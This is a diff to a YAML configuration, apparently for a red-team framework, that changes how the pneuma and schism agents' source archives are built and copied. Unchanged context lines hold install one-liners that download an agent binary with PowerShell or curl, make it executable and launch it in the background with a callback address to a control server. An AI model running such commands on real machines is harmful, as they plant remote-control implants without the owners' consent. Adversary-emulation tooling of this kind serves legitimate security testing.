@@ -28,7 +28,7 @@ pneuma:
       GOOS=darwin go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-darwin SRC.PATH/main.go && \
       GOOS=linux go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-linux SRC.PATH/main.go && \
       GOOS=windows go build -ldflags="-s -w -X main.randomHash=$(openssl rand -base64 16)" -o DST.PATH/pneuma-windows.exe SRC.PATH/main.go && \
-      git archive --format zip --output "DST.PATH/pneuma-source.zip" master
+      git archive --format zip --output "DST.PATH/pneuma-source.zip" master && cp SRC.PATH/pneuma-source.zip DST.PATH;
     platforms:
       - linux
       - windows
@@ -51,15 +51,15 @@ pneuma:
         $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
         Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
     pneuma-darwin: {}
-    pneuma-source.zip:
-      install: |
-        cp SRC.PATH/pneuma-source.zip DST.PATH
+    pneuma-source.zip: {}
+
 schism:
   metadata:
     description: Simple FTP agent (requires a translator)
     purpose: agent
     build: |
-      cp SRC.PATH/schism.py DST.PATH
+      zip -r DST.PATH/schism-source.zip DST.PATH && \
+      cp SRC.PATH/* DST.PATH;
     platforms: 
       - windows
       - linux
@@ -70,6 +70,7 @@ schism:
     schism.py:
       install: |
         curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
+    schism-source.zip: {}
 
 nicodemus:
   metadata:
